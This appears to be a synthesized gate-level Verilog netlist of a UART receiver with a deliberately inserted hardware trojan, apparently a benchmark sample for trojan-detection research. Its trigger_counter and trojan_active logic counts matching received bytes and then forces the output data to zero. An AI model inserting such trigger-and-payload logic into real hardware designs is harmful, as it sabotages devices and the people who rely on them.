/* Generated by Yosys 0.9 (git sha1 1979e0b) */

module uart_rx(clk, resetn, uart_rxd, uart_rx_en, uart_rx_break, uart_rx_valid, uart_rx_data);
  wire [3:0] _000_;
  wire _001_;
  wire [13:0] _002_;
  wire [7:0] _003_;
  wire _004_;
  wire _005_;
  wire [7:0] _006_;
  wire _007_;
  wire [7:0] _008_;
  wire _009_;
  wire _010_;
  wire _011_;
  wire _012_;
  wire _013_;
  wire _014_;
  wire _015_;
  wire _016_;
  wire _017_;
  wire _018_;
  wire _019_;
  wire _020_;
  wire _021_;
  wire _022_;
  wire _023_;
  wire _024_;
  wire _025_;
  wire _026_;
  wire _027_;
  wire _028_;
  wire _029_;
  wire _030_;
  wire _031_;
  wire _032_;
  wire _033_;
  wire _034_;
  wire _035_;
  wire _036_;
  wire _037_;
  wire _038_;
  wire _039_;
  wire _040_;
  wire _041_;
  wire _042_;
  wire _043_;
  wire _044_;
  wire _045_;
  wire _046_;
  wire _047_;
  wire _048_;
  wire _049_;
  wire _050_;
  wire _051_;
  wire _052_;
  wire _053_;
  wire _054_;
  wire _055_;
  wire _056_;
  wire _057_;
  wire _058_;
  wire _059_;
  wire _060_;
  wire _061_;
  wire _062_;
  wire _063_;
  wire _064_;
  wire _065_;
  wire _066_;
  wire _067_;
  wire _068_;
  wire _069_;
  wire _070_;
  wire _071_;
  wire _072_;
  wire _073_;
  wire _074_;
  wire _075_;
  wire _076_;
  wire _077_;
  wire _078_;
  wire _079_;
  wire _080_;
  wire _081_;
  wire _082_;
  wire _083_;
  wire _084_;
  wire _085_;
  wire _086_;
  wire _087_;
  wire _088_;
  wire _089_;
  wire _090_;
  wire _091_;
  wire _092_;
  wire _093_;
  wire _094_;
  wire _095_;
  wire _096_;
  wire _097_;
  wire _098_;
  wire _099_;
  wire _100_;
  wire _101_;
  wire _102_;
  wire _103_;
  wire _104_;
  wire _105_;
  wire _106_;
  wire _107_;
  wire _108_;
  wire _109_;
  wire _110_;
  wire _111_;
  wire _112_;
  wire _113_;
  wire _114_;
  wire _115_;
  wire _116_;
  wire _117_;
  wire _118_;
  wire _119_;
  wire _120_;
  wire _121_;
  wire _122_;
  wire _123_;
  wire _124_;
  wire _125_;
  wire _126_;
  wire _127_;
  wire _128_;
  wire _129_;
  wire _130_;
  wire _131_;
  wire _132_;
  wire _133_;
  wire _134_;
  reg [3:0] bit_counter;
  reg bit_sample;
  input clk;
  reg [13:0] cycle_counter;
  reg [3:0] fsm_state;
  reg [7:0] received_data;
  input resetn;
  reg rxd_reg;
  reg rxd_reg_0;
  reg [7:0] trigger_counter = 8'h00;
  reg trojan_active = 1'h0;
  output uart_rx_break;
  output [7:0] uart_rx_data;
  reg [7:0] uart_rx_data;
  input uart_rx_en;
  output uart_rx_valid;
  input uart_rxd;
  sky130_fd_sc_hd__clkinv_1 _135_ (
    .A(fsm_state[3]),
    .Y(_013_)
  );
  sky130_fd_sc_hd__clkinv_1 _136_ (
    .A(cycle_counter[9]),
    .Y(_014_)
  );
  sky130_fd_sc_hd__clkinv_1 _137_ (
    .A(trigger_counter[6]),
    .Y(_015_)
  );
  sky130_fd_sc_hd__clkinv_1 _138_ (
    .A(bit_sample),
    .Y(_016_)
  );
  sky130_fd_sc_hd__nand2_1 _139_ (
    .A(rxd_reg),
    .B(fsm_state[0]),
    .Y(_017_)
  );
  sky130_fd_sc_hd__nor4_1 _140_ (
    .A(cycle_counter[1]),
    .B(cycle_counter[0]),
    .C(cycle_counter[5]),
    .D(cycle_counter[4]),
    .Y(_018_)
  );
  sky130_fd_sc_hd__nor4bb_1 _141_ (
    .A(cycle_counter[10]),
    .B(cycle_counter[13]),
    .C_N(cycle_counter[7]),
    .D_N(cycle_counter[8]),
    .Y(_019_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _142_ (
    .A(cycle_counter[2]),
    .SLEEP(cycle_counter[3]),
    .X(_020_)
  );
  sky130_fd_sc_hd__nor4bb_1 _143_ (
    .A(cycle_counter[9]),
    .B(cycle_counter[12]),
    .C_N(cycle_counter[11]),
    .D_N(cycle_counter[6]),
    .Y(_021_)
  );
  sky130_fd_sc_hd__nand4_1 _144_ (
    .A(_018_),
    .B(_019_),
    .C(_020_),
    .D(_021_),
    .Y(_022_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _145_ (
    .A(cycle_counter[3]),
    .SLEEP(cycle_counter[2]),
    .X(_023_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _146_ (
    .A(cycle_counter[12]),
    .SLEEP(cycle_counter[11]),
    .X(_024_)
  );
  sky130_fd_sc_hd__nor4bb_1 _147_ (
    .A(cycle_counter[6]),
    .B(cycle_counter[11]),
    .C_N(cycle_counter[12]),
    .D_N(cycle_counter[9]),
    .Y(_025_)
  );
  sky130_fd_sc_hd__nand4_1 _148_ (
    .A(_018_),
    .B(_019_),
    .C(_023_),
    .D(_025_),
    .Y(_026_)
  );
  sky130_fd_sc_hd__o21ai_0 _149_ (
    .A1(_013_),
    .A2(_022_),
    .B1(_026_),
    .Y(_027_)
  );
  sky130_fd_sc_hd__clkinv_1 _150_ (
    .A(_027_),
    .Y(_028_)
  );
  sky130_fd_sc_hd__nand2_1 _151_ (
    .A(fsm_state[3]),
    .B(_027_),
    .Y(_029_)
  );
  sky130_fd_sc_hd__nor4b_1 _152_ (
    .A(cycle_counter[5]),
    .B(cycle_counter[4]),
    .C(cycle_counter[6]),
    .D_N(cycle_counter[9]),
    .Y(_030_)
  );
  sky130_fd_sc_hd__nor4b_1 _153_ (
    .A(cycle_counter[1]),
    .B(cycle_counter[0]),
    .C(cycle_counter[2]),
    .D_N(cycle_counter[3]),
    .Y(_031_)
  );
  sky130_fd_sc_hd__nand4_1 _154_ (
    .A(_019_),
    .B(_024_),
    .C(_030_),
    .D(_031_),
    .Y(_032_)
  );
  sky130_fd_sc_hd__o21ai_0 _155_ (
    .A1(_013_),
    .A2(_022_),
    .B1(_032_),
    .Y(_033_)
  );
  sky130_fd_sc_hd__nand3_1 _156_ (
    .A(resetn),
    .B(_017_),
    .C(_029_),
    .Y(_009_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _157_ (
    .A(resetn),
    .SLEEP(_033_),
    .X(_034_)
  );
  sky130_fd_sc_hd__nand2_1 _158_ (
    .A(resetn),
    .B(_028_),
    .Y(_035_)
  );
  sky130_fd_sc_hd__nor4b_1 _159_ (
    .A(bit_counter[1]),
    .B(bit_counter[0]),
    .C(bit_counter[2]),
    .D_N(bit_counter[3]),
    .Y(_036_)
  );
  sky130_fd_sc_hd__nand2_1 _160_ (
    .A(resetn),
    .B(fsm_state[1]),
    .Y(_037_)
  );
  sky130_fd_sc_hd__nand3_1 _161_ (
    .A(resetn),
    .B(fsm_state[1]),
    .C(_036_),
    .Y(_038_)
  );
  sky130_fd_sc_hd__o21ai_0 _162_ (
    .A1(_013_),
    .A2(_035_),
    .B1(_038_),
    .Y(_012_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _163_ (
    .A(fsm_state[0]),
    .SLEEP(rxd_reg),
    .X(_039_)
  );
  sky130_fd_sc_hd__a22o_1 _164_ (
    .A1(fsm_state[2]),
    .A2(_034_),
    .B1(_039_),
    .B2(resetn),
    .X(_011_)
  );
  sky130_fd_sc_hd__nand3_1 _165_ (
    .A(resetn),
    .B(fsm_state[2]),
    .C(_033_),
    .Y(_040_)
  );
  sky130_fd_sc_hd__o21ai_0 _166_ (
    .A1(_036_),
    .A2(_037_),
    .B1(_040_),
    .Y(_010_)
  );
  sky130_fd_sc_hd__or3_1 _167_ (
    .A(fsm_state[1]),
    .B(fsm_state[2]),
    .C(_039_),
    .X(_041_)
  );
  sky130_fd_sc_hd__a211oi_1 _168_ (
    .A1(_022_),
    .A2(_026_),
    .B1(_041_),
    .C1(_013_),
    .Y(uart_rx_valid)
  );
  sky130_fd_sc_hd__nor4_1 _169_ (
    .A(received_data[6]),
    .B(received_data[4]),
    .C(received_data[2]),
    .D(received_data[0]),
    .Y(_042_)
  );
  sky130_fd_sc_hd__nor4_1 _170_ (
    .A(received_data[7]),
    .B(received_data[5]),
    .C(received_data[3]),
    .D(received_data[1]),
    .Y(_043_)
  );
  sky130_fd_sc_hd__and3_1 _171_ (
    .A(uart_rx_valid),
    .B(_042_),
    .C(_043_),
    .X(uart_rx_break)
  );
  sky130_fd_sc_hd__and4_1 _172_ (
    .A(received_data[7]),
    .B(received_data[5]),
    .C(received_data[3]),
    .D(received_data[1]),
    .X(_044_)
  );
  sky130_fd_sc_hd__nand2_1 _173_ (
    .A(_042_),
    .B(_044_),
    .Y(_045_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _174_ (
    .A(uart_rx_valid),
    .SLEEP(_045_),
    .X(_046_)
  );
  sky130_fd_sc_hd__nand2_1 _175_ (
    .A(trigger_counter[0]),
    .B(uart_rx_valid),
    .Y(_047_)
  );
  sky130_fd_sc_hd__o211a_1 _176_ (
    .A1(trigger_counter[0]),
    .A2(_046_),
    .B1(_047_),
    .C1(resetn),
    .X(_006_[0])
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _177_ (
    .A(trigger_counter[1]),
    .SLEEP(uart_rx_valid),
    .X(_048_)
  );
  sky130_fd_sc_hd__nand2_1 _178_ (
    .A(trigger_counter[0]),
    .B(trigger_counter[1]),
    .Y(_049_)
  );
  sky130_fd_sc_hd__xor2_1 _179_ (
    .A(trigger_counter[0]),
    .B(trigger_counter[1]),
    .X(_050_)
  );
  sky130_fd_sc_hd__a21oi_1 _180_ (
    .A1(_046_),
    .A2(_050_),
    .B1(_048_),
    .Y(_051_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _181_ (
    .A(resetn),
    .SLEEP(_051_),
    .X(_006_[1])
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _182_ (
    .A(trigger_counter[2]),
    .SLEEP(uart_rx_valid),
    .X(_052_)
  );
  sky130_fd_sc_hd__xnor2_1 _183_ (
    .A(trigger_counter[2]),
    .B(_049_),
    .Y(_053_)
  );
  sky130_fd_sc_hd__a21oi_1 _184_ (
    .A1(_046_),
    .A2(_053_),
    .B1(_052_),
    .Y(_054_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _185_ (
    .A(resetn),
    .SLEEP(_054_),
    .X(_006_[2])
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _186_ (
    .A(trigger_counter[3]),
    .SLEEP(uart_rx_valid),
    .X(_055_)
  );
  sky130_fd_sc_hd__and4_1 _187_ (
    .A(trigger_counter[0]),
    .B(trigger_counter[1]),
    .C(trigger_counter[2]),
    .D(trigger_counter[3]),
    .X(_056_)
  );
  sky130_fd_sc_hd__a31oi_1 _188_ (
    .A1(trigger_counter[0]),
    .A2(trigger_counter[1]),
    .A3(trigger_counter[2]),
    .B1(trigger_counter[3]),
    .Y(_057_)
  );
  sky130_fd_sc_hd__nor2_1 _189_ (
    .A(_056_),
    .B(_057_),
    .Y(_058_)
  );
  sky130_fd_sc_hd__a21oi_1 _190_ (
    .A1(_046_),
    .A2(_058_),
    .B1(_055_),
    .Y(_059_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _191_ (
    .A(resetn),
    .SLEEP(_059_),
    .X(_006_[3])
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _192_ (
    .A(trigger_counter[4]),
    .SLEEP(uart_rx_valid),
    .X(_060_)
  );
  sky130_fd_sc_hd__nand2_1 _193_ (
    .A(trigger_counter[4]),
    .B(_056_),
    .Y(_061_)
  );
  sky130_fd_sc_hd__a21oi_1 _194_ (
    .A1(_046_),
    .A2(_061_),
    .B1(_060_),
    .Y(_062_)
  );
  sky130_fd_sc_hd__o21ai_0 _195_ (
    .A1(trigger_counter[4]),
    .A2(_056_),
    .B1(resetn),
    .Y(_063_)
  );
  sky130_fd_sc_hd__nor2_1 _196_ (
    .A(_062_),
    .B(_063_),
    .Y(_006_[4])
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _197_ (
    .A(trigger_counter[5]),
    .SLEEP(uart_rx_valid),
    .X(_064_)
  );
  sky130_fd_sc_hd__nand3_1 _198_ (
    .A(trigger_counter[4]),
    .B(trigger_counter[5]),
    .C(_056_),
    .Y(_065_)
  );
  sky130_fd_sc_hd__clkinv_1 _199_ (
    .A(_065_),
    .Y(_066_)
  );
  sky130_fd_sc_hd__a21oi_1 _200_ (
    .A1(_046_),
    .A2(_065_),
    .B1(_064_),
    .Y(_067_)
  );
  sky130_fd_sc_hd__a21oi_1 _201_ (
    .A1(trigger_counter[4]),
    .A2(_056_),
    .B1(trigger_counter[5]),
    .Y(_068_)
  );
  sky130_fd_sc_hd__nor3b_1 _202_ (
    .A(_067_),
    .B(_068_),
    .C_N(resetn),
    .Y(_006_[5])
  );
  sky130_fd_sc_hd__o21ai_0 _203_ (
    .A1(_029_),
    .A2(_041_),
    .B1(trigger_counter[6]),
    .Y(_069_)
  );
  sky130_fd_sc_hd__o21ai_0 _204_ (
    .A1(_015_),
    .A2(_065_),
    .B1(_046_),
    .Y(_070_)
  );
  sky130_fd_sc_hd__o21ai_0 _205_ (
    .A1(trigger_counter[6]),
    .A2(_066_),
    .B1(resetn),
    .Y(_071_)
  );
  sky130_fd_sc_hd__a21oi_1 _206_ (
    .A1(_069_),
    .A2(_070_),
    .B1(_071_),
    .Y(_006_[6])
  );
  sky130_fd_sc_hd__a31o_1 _207_ (
    .A1(trigger_counter[6]),
    .A2(_046_),
    .A3(_066_),
    .B1(trigger_counter[7]),
    .X(_072_)
  );
  sky130_fd_sc_hd__and3_1 _208_ (
    .A(trigger_counter[6]),
    .B(trigger_counter[7]),
    .C(_066_),
    .X(_073_)
  );
  sky130_fd_sc_hd__o21ai_0 _209_ (
    .A1(_045_),
    .A2(_073_),
    .B1(uart_rx_valid),
    .Y(_074_)
  );
  sky130_fd_sc_hd__and3_1 _210_ (
    .A(resetn),
    .B(_072_),
    .C(_074_),
    .X(_006_[7])
  );
  sky130_fd_sc_hd__mux2i_1 _211_ (
    .A0(rxd_reg_0),
    .A1(uart_rxd),
    .S(uart_rx_en),
    .Y(_075_)
  );
  sky130_fd_sc_hd__nand2_1 _212_ (
    .A(resetn),
    .B(_075_),
    .Y(_005_)
  );
  sky130_fd_sc_hd__mux2i_1 _213_ (
    .A0(rxd_reg),
    .A1(rxd_reg_0),
    .S(uart_rx_en),
    .Y(_076_)
  );
  sky130_fd_sc_hd__nand2_1 _214_ (
    .A(resetn),
    .B(_076_),
    .Y(_004_)
  );
  sky130_fd_sc_hd__nor4_1 _215_ (
    .A(fsm_state[3]),
    .B(cycle_counter[0]),
    .C(fsm_state[1]),
    .D(fsm_state[2]),
    .Y(_077_)
  );
  sky130_fd_sc_hd__o31a_1 _216_ (
    .A1(fsm_state[3]),
    .A2(fsm_state[1]),
    .A3(fsm_state[2]),
    .B1(cycle_counter[0]),
    .X(_078_)
  );
  sky130_fd_sc_hd__nor3_1 _217_ (
    .A(_035_),
    .B(_077_),
    .C(_078_),
    .Y(_002_[0])
  );
  sky130_fd_sc_hd__o311a_1 _218_ (
    .A1(fsm_state[3]),
    .A2(fsm_state[1]),
    .A3(fsm_state[2]),
    .B1(cycle_counter[1]),
    .C1(cycle_counter[0]),
    .X(_079_)
  );
  sky130_fd_sc_hd__o21ai_0 _219_ (
    .A1(cycle_counter[1]),
    .A2(_078_),
    .B1(resetn),
    .Y(_080_)
  );
  sky130_fd_sc_hd__nor2_1 _220_ (
    .A(_079_),
    .B(_080_),
    .Y(_002_[1])
  );
  sky130_fd_sc_hd__and2_0 _221_ (
    .A(cycle_counter[2]),
    .B(_079_),
    .X(_081_)
  );
  sky130_fd_sc_hd__nor2_1 _222_ (
    .A(cycle_counter[2]),
    .B(_079_),
    .Y(_082_)
  );
  sky130_fd_sc_hd__nor3_1 _223_ (
    .A(_035_),
    .B(_081_),
    .C(_082_),
    .Y(_002_[2])
  );
  sky130_fd_sc_hd__nor2_1 _224_ (
    .A(cycle_counter[3]),
    .B(_081_),
    .Y(_083_)
  );
  sky130_fd_sc_hd__and2_0 _225_ (
    .A(cycle_counter[2]),
    .B(cycle_counter[3]),
    .X(_084_)
  );
  sky130_fd_sc_hd__and2_0 _226_ (
    .A(_079_),
    .B(_084_),
    .X(_085_)
  );
  sky130_fd_sc_hd__nor3_1 _227_ (
    .A(_035_),
    .B(_083_),
    .C(_085_),
    .Y(_002_[3])
  );
  sky130_fd_sc_hd__and3_1 _228_ (
    .A(cycle_counter[4]),
    .B(_079_),
    .C(_084_),
    .X(_086_)
  );
  sky130_fd_sc_hd__nand3_1 _229_ (
    .A(cycle_counter[4]),
    .B(_079_),
    .C(_084_),
    .Y(_087_)
  );
  sky130_fd_sc_hd__o21ai_0 _230_ (
    .A1(cycle_counter[4]),
    .A2(_085_),
    .B1(resetn),
    .Y(_088_)
  );
  sky130_fd_sc_hd__nor2_1 _231_ (
    .A(_086_),
    .B(_088_),
    .Y(_002_[4])
  );
  sky130_fd_sc_hd__o21ai_0 _232_ (
    .A1(cycle_counter[5]),
    .A2(_086_),
    .B1(resetn),
    .Y(_089_)
  );
  sky130_fd_sc_hd__a21oi_1 _233_ (
    .A1(cycle_counter[5]),
    .A2(_086_),
    .B1(_089_),
    .Y(_002_[5])
  );
  sky130_fd_sc_hd__and3_1 _234_ (
    .A(cycle_counter[5]),
    .B(cycle_counter[6]),
    .C(_086_),
    .X(_090_)
  );
  sky130_fd_sc_hd__a21oi_1 _235_ (
    .A1(cycle_counter[5]),
    .A2(_086_),
    .B1(cycle_counter[6]),
    .Y(_091_)
  );
  sky130_fd_sc_hd__nor3_1 _236_ (
    .A(_035_),
    .B(_090_),
    .C(_091_),
    .Y(_002_[6])
  );
  sky130_fd_sc_hd__o21ai_0 _237_ (
    .A1(cycle_counter[7]),
    .A2(_090_),
    .B1(_034_),
    .Y(_092_)
  );
  sky130_fd_sc_hd__a21oi_1 _238_ (
    .A1(cycle_counter[7]),
    .A2(_090_),
    .B1(_092_),
    .Y(_002_[7])
  );
  sky130_fd_sc_hd__a21oi_1 _239_ (
    .A1(cycle_counter[7]),
    .A2(_090_),
    .B1(cycle_counter[8]),
    .Y(_093_)
  );
  sky130_fd_sc_hd__nand4_1 _240_ (
    .A(cycle_counter[5]),
    .B(cycle_counter[6]),
    .C(cycle_counter[7]),
    .D(cycle_counter[8]),
    .Y(_094_)
  );
  sky130_fd_sc_hd__nor2_1 _241_ (
    .A(_087_),
    .B(_094_),
    .Y(_095_)
  );
  sky130_fd_sc_hd__nor3_1 _242_ (
    .A(_035_),
    .B(_093_),
    .C(_095_),
    .Y(_002_[8])
  );
  sky130_fd_sc_hd__nor3_1 _243_ (
    .A(_014_),
    .B(_087_),
    .C(_094_),
    .Y(_096_)
  );
  sky130_fd_sc_hd__o21ai_0 _244_ (
    .A1(cycle_counter[9]),
    .A2(_095_),
    .B1(_034_),
    .Y(_097_)
  );
  sky130_fd_sc_hd__nor2_1 _245_ (
    .A(_096_),
    .B(_097_),
    .Y(_002_[9])
  );
  sky130_fd_sc_hd__o21ai_0 _246_ (
    .A1(cycle_counter[10]),
    .A2(_096_),
    .B1(resetn),
    .Y(_098_)
  );
  sky130_fd_sc_hd__a21oi_1 _247_ (
    .A1(cycle_counter[10]),
    .A2(_096_),
    .B1(_098_),
    .Y(_002_[10])
  );
  sky130_fd_sc_hd__a21oi_1 _248_ (
    .A1(cycle_counter[10]),
    .A2(_096_),
    .B1(cycle_counter[11]),
    .Y(_099_)
  );
  sky130_fd_sc_hd__a311oi_1 _249_ (
    .A1(cycle_counter[11]),
    .A2(cycle_counter[10]),
    .A3(_096_),
    .B1(_099_),
    .C1(_035_),
    .Y(_002_[11])
  );
  sky130_fd_sc_hd__and4_1 _250_ (
    .A(cycle_counter[11]),
    .B(cycle_counter[10]),
    .C(cycle_counter[12]),
    .D(_096_),
    .X(_100_)
  );
  sky130_fd_sc_hd__a31oi_1 _251_ (
    .A1(cycle_counter[11]),
    .A2(cycle_counter[10]),
    .A3(_096_),
    .B1(cycle_counter[12]),
    .Y(_101_)
  );
  sky130_fd_sc_hd__nor3_1 _252_ (
    .A(_035_),
    .B(_100_),
    .C(_101_),
    .Y(_002_[12])
  );
  sky130_fd_sc_hd__xor2_1 _253_ (
    .A(cycle_counter[13]),
    .B(_100_),
    .X(_102_)
  );
  sky130_fd_sc_hd__and2_0 _254_ (
    .A(resetn),
    .B(_102_),
    .X(_002_[13])
  );
  sky130_fd_sc_hd__nand2_1 _255_ (
    .A(fsm_state[1]),
    .B(_027_),
    .Y(_103_)
  );
  sky130_fd_sc_hd__nand2b_1 _256_ (
    .A_N(fsm_state[0]),
    .B(resetn),
    .Y(_104_)
  );
  sky130_fd_sc_hd__or3_1 _257_ (
    .A(fsm_state[3]),
    .B(fsm_state[2]),
    .C(_104_),
    .X(_105_)
  );
  sky130_fd_sc_hd__and2_0 _258_ (
    .A(fsm_state[1]),
    .B(_033_),
    .X(_106_)
  );
  sky130_fd_sc_hd__xnor2_1 _259_ (
    .A(bit_counter[0]),
    .B(_106_),
    .Y(_107_)
  );
  sky130_fd_sc_hd__nor2_1 _260_ (
    .A(_105_),
    .B(_107_),
    .Y(_000_[0])
  );
  sky130_fd_sc_hd__a21oi_1 _261_ (
    .A1(bit_counter[0]),
    .A2(_106_),
    .B1(bit_counter[1]),
    .Y(_108_)
  );
  sky130_fd_sc_hd__and4_1 _262_ (
    .A(fsm_state[1]),
    .B(bit_counter[1]),
    .C(bit_counter[0]),
    .D(_027_),
    .X(_109_)
  );
  sky130_fd_sc_hd__nor3_1 _263_ (
    .A(_105_),
    .B(_108_),
    .C(_109_),
    .Y(_000_[1])
  );
  sky130_fd_sc_hd__nor2_1 _264_ (
    .A(bit_counter[2]),
    .B(_109_),
    .Y(_110_)
  );
  sky130_fd_sc_hd__and4_1 _265_ (
    .A(bit_counter[1]),
    .B(bit_counter[0]),
    .C(bit_counter[2]),
    .D(_106_),
    .X(_111_)
  );
  sky130_fd_sc_hd__nor3_1 _266_ (
    .A(_105_),
    .B(_110_),
    .C(_111_),
    .Y(_000_[2])
  );
  sky130_fd_sc_hd__a21oi_1 _267_ (
    .A1(bit_counter[2]),
    .A2(_109_),
    .B1(bit_counter[3]),
    .Y(_112_)
  );
  sky130_fd_sc_hd__a311oi_1 _268_ (
    .A1(bit_counter[2]),
    .A2(bit_counter[3]),
    .A3(_109_),
    .B1(_112_),
    .C1(_105_),
    .Y(_000_[3])
  );
  sky130_fd_sc_hd__nand2b_1 _269_ (
    .A_N(trojan_active),
    .B(resetn),
    .Y(_113_)
  );
  sky130_fd_sc_hd__mux2i_1 _270_ (
    .A0(uart_rx_data[0]),
    .A1(received_data[0]),
    .S(fsm_state[3]),
    .Y(_114_)
  );
  sky130_fd_sc_hd__nor2_1 _271_ (
    .A(_113_),
    .B(_114_),
    .Y(_008_[0])
  );
  sky130_fd_sc_hd__mux2i_1 _272_ (
    .A0(uart_rx_data[1]),
    .A1(received_data[1]),
    .S(fsm_state[3]),
    .Y(_115_)
  );
  sky130_fd_sc_hd__nor2_1 _273_ (
    .A(_113_),
    .B(_115_),
    .Y(_008_[1])
  );
  sky130_fd_sc_hd__mux2i_1 _274_ (
    .A0(uart_rx_data[2]),
    .A1(received_data[2]),
    .S(fsm_state[3]),
    .Y(_116_)
  );
  sky130_fd_sc_hd__nor2_1 _275_ (
    .A(_113_),
    .B(_116_),
    .Y(_008_[2])
  );
  sky130_fd_sc_hd__mux2i_1 _276_ (
    .A0(uart_rx_data[3]),
    .A1(received_data[3]),
    .S(fsm_state[3]),
    .Y(_117_)
  );
  sky130_fd_sc_hd__nor2_1 _277_ (
    .A(_113_),
    .B(_117_),
    .Y(_008_[3])
  );
  sky130_fd_sc_hd__mux2i_1 _278_ (
    .A0(uart_rx_data[4]),
    .A1(received_data[4]),
    .S(fsm_state[3]),
    .Y(_118_)
  );
  sky130_fd_sc_hd__nor2_1 _279_ (
    .A(_113_),
    .B(_118_),
    .Y(_008_[4])
  );
  sky130_fd_sc_hd__mux2i_1 _280_ (
    .A0(uart_rx_data[5]),
    .A1(received_data[5]),
    .S(fsm_state[3]),
    .Y(_119_)
  );
  sky130_fd_sc_hd__nor2_1 _281_ (
    .A(_113_),
    .B(_119_),
    .Y(_008_[5])
  );
  sky130_fd_sc_hd__mux2i_1 _282_ (
    .A0(uart_rx_data[6]),
    .A1(received_data[6]),
    .S(fsm_state[3]),
    .Y(_120_)
  );
  sky130_fd_sc_hd__nor2_1 _283_ (
    .A(_113_),
    .B(_120_),
    .Y(_008_[6])
  );
  sky130_fd_sc_hd__mux2i_1 _284_ (
    .A0(uart_rx_data[7]),
    .A1(received_data[7]),
    .S(fsm_state[3]),
    .Y(_121_)
  );
  sky130_fd_sc_hd__nor2_1 _285_ (
    .A(_113_),
    .B(_121_),
    .Y(_008_[7])
  );
  sky130_fd_sc_hd__or4_1 _286_ (
    .A(trigger_counter[3]),
    .B(trigger_counter[4]),
    .C(trigger_counter[6]),
    .D(trigger_counter[7]),
    .X(_122_)
  );
  sky130_fd_sc_hd__o31a_1 _287_ (
    .A1(trigger_counter[5]),
    .A2(trojan_active),
    .A3(_122_),
    .B1(resetn),
    .X(_007_)
  );
  sky130_fd_sc_hd__o21ai_0 _288_ (
    .A1(rxd_reg),
    .A2(_022_),
    .B1(resetn),
    .Y(_123_)
  );
  sky130_fd_sc_hd__a21oi_1 _289_ (
    .A1(_016_),
    .A2(_022_),
    .B1(_123_),
    .Y(_001_)
  );
  sky130_fd_sc_hd__nand3_1 _290_ (
    .A(fsm_state[1]),
    .B(received_data[2]),
    .C(_027_),
    .Y(_124_)
  );
  sky130_fd_sc_hd__nand2_1 _291_ (
    .A(received_data[1]),
    .B(_103_),
    .Y(_125_)
  );
  sky130_fd_sc_hd__a21oi_1 _292_ (
    .A1(_124_),
    .A2(_125_),
    .B1(_104_),
    .Y(_003_[1])
  );
  sky130_fd_sc_hd__nand3_1 _293_ (
    .A(fsm_state[1]),
    .B(received_data[1]),
    .C(_027_),
    .Y(_126_)
  );
  sky130_fd_sc_hd__nand2_1 _294_ (
    .A(received_data[0]),
    .B(_103_),
    .Y(_127_)
  );
  sky130_fd_sc_hd__a21oi_1 _295_ (
    .A1(_126_),
    .A2(_127_),
    .B1(_104_),
    .Y(_003_[0])
  );
  sky130_fd_sc_hd__mux2i_1 _296_ (
    .A0(received_data[3]),
    .A1(received_data[2]),
    .S(_103_),
    .Y(_128_)
  );
  sky130_fd_sc_hd__nor2_1 _297_ (
    .A(_104_),
    .B(_128_),
    .Y(_003_[2])
  );
  sky130_fd_sc_hd__nand3_1 _298_ (
    .A(fsm_state[1]),
    .B(received_data[4]),
    .C(_027_),
    .Y(_129_)
  );
  sky130_fd_sc_hd__nand2_1 _299_ (
    .A(received_data[3]),
    .B(_103_),
    .Y(_130_)
  );
  sky130_fd_sc_hd__a21oi_1 _300_ (
    .A1(_129_),
    .A2(_130_),
    .B1(_104_),
    .Y(_003_[3])
  );
  sky130_fd_sc_hd__mux2i_1 _301_ (
    .A0(received_data[5]),
    .A1(received_data[4]),
    .S(_103_),
    .Y(_131_)
  );
  sky130_fd_sc_hd__nor2_1 _302_ (
    .A(_104_),
    .B(_131_),
    .Y(_003_[4])
  );
  sky130_fd_sc_hd__mux2i_1 _303_ (
    .A0(received_data[6]),
    .A1(received_data[5]),
    .S(_103_),
    .Y(_132_)
  );
  sky130_fd_sc_hd__nor2_1 _304_ (
    .A(_104_),
    .B(_132_),
    .Y(_003_[5])
  );
  sky130_fd_sc_hd__mux2i_1 _305_ (
    .A0(received_data[7]),
    .A1(received_data[6]),
    .S(_103_),
    .Y(_133_)
  );
  sky130_fd_sc_hd__nor2_1 _306_ (
    .A(_104_),
    .B(_133_),
    .Y(_003_[6])
  );
  sky130_fd_sc_hd__nor2_1 _307_ (
    .A(received_data[7]),
    .B(_106_),
    .Y(_134_)
  );
  sky130_fd_sc_hd__a211oi_1 _308_ (
    .A1(_016_),
    .A2(_106_),
    .B1(_134_),
    .C1(_104_),
    .Y(_003_[7])
  );
  always @(posedge clk)
      fsm_state[0] <= _009_;
  always @(posedge clk)
      fsm_state[1] <= _010_;
  always @(posedge clk)
      fsm_state[2] <= _011_;
  always @(posedge clk)
      fsm_state[3] <= _012_;
  always @(posedge clk)
      trigger_counter[0] <= _006_[0];
  always @(posedge clk)
      trigger_counter[1] <= _006_[1];
  always @(posedge clk)
      trigger_counter[2] <= _006_[2];
  always @(posedge clk)
      trigger_counter[3] <= _006_[3];
  always @(posedge clk)
      trigger_counter[4] <= _006_[4];
  always @(posedge clk)
      trigger_counter[5] <= _006_[5];
  always @(posedge clk)
      trigger_counter[6] <= _006_[6];
  always @(posedge clk)
      trigger_counter[7] <= _006_[7];
  always @(posedge clk)
      trojan_active <= _007_;
  always @(posedge clk)
      rxd_reg <= _004_;
  always @(posedge clk)
      rxd_reg_0 <= _005_;
  always @(posedge clk)
      cycle_counter[0] <= _002_[0];
  always @(posedge clk)
      cycle_counter[1] <= _002_[1];
  always @(posedge clk)
      cycle_counter[2] <= _002_[2];
  always @(posedge clk)
      cycle_counter[3] <= _002_[3];
  always @(posedge clk)
      cycle_counter[4] <= _002_[4];
  always @(posedge clk)
      cycle_counter[5] <= _002_[5];
  always @(posedge clk)
      cycle_counter[6] <= _002_[6];
  always @(posedge clk)
      cycle_counter[7] <= _002_[7];
  always @(posedge clk)
      cycle_counter[8] <= _002_[8];
  always @(posedge clk)
      cycle_counter[9] <= _002_[9];
  always @(posedge clk)
      cycle_counter[10] <= _002_[10];
  always @(posedge clk)
      cycle_counter[11] <= _002_[11];
  always @(posedge clk)
